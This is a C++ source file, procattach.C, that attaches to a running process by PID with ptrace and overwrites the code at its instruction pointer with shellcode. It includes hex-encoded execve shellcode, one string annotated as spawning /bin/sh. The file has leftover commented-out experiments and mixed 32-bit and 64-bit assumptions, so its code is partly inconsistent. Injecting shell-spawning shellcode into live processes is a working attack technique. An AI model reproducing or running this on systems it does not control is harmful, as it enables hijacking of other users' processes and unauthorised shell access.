/*
 * procattach.C
 * 
 * Copyright 2012 Unknown <s-wang_cary@client-101>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 * 
 * 
 */


#include <iostream>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/user.h>
#include <math.h>
#include <string.h>
using namespace std;
void injected_func(void** start, void** end)
{
	cout << &&s << " " << &&e << endl;
	*start=&&s;
	*end=&&e;
	return;
	s:
	//code to be injected
	asm("hlt");
	e:;
}
#define WORDSIZE 4
typedef unsigned long long int PTR;
typedef unsigned int WORD;
void set_data(pid_t pid, PTR addr, const void* src, int len)
{
	int l=(int)ceil((double)len/WORDSIZE);
    //cout << l << endl;
    int i;
    for(i=0;i<l;i++)
    {
		//cout << start[i] << endl;
		cout << ptrace(PTRACE_POKEDATA, pid, addr + (i * WORDSIZE), ((WORD*)src)[i]) << endl;
	}
}
int main(int argc, char **argv)
{
	//asm("hlt");
	char *SC = "\x31\xc0\xbb\x08\x84\x04\x08\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
           
    /*void (*tmp1)();
    tmp1=(void(*)())SC;
    tmp1();
    return 0;*/
	
	
	if(argc<2)
	{
		cout << "Usage: " << argv[0] << " pid" << endl;
		return 1;
	}
	pid_t pid;
	pid=atoi(argv[1]);
	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid,NULL,0);
    
    user_regs_struct r;
    ptrace(PTRACE_GETREGS, pid, NULL, &r);
    
    //code to be injected:
    cout << "eip: " << (void*)r.rip << endl;
    
    char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall
    
    
    /*char code[] = {(char)0xcd,(char)0x80,(char)0xcc,(char)0};
    cout << ptrace(PTRACE_POKEDATA, pid, r.rip, *((int*)code)) << endl;
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;*/
    
    //WORD *start,*end;
    //injected_func((void**)&start,(void**)&end);
    
    //int i;
    unsigned char code[] = {0xcd,0x80,0xcc,0};
    set_data(pid,r.rip,(char*)SC,strlen((char*)SC));
    
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
	return 0;
}

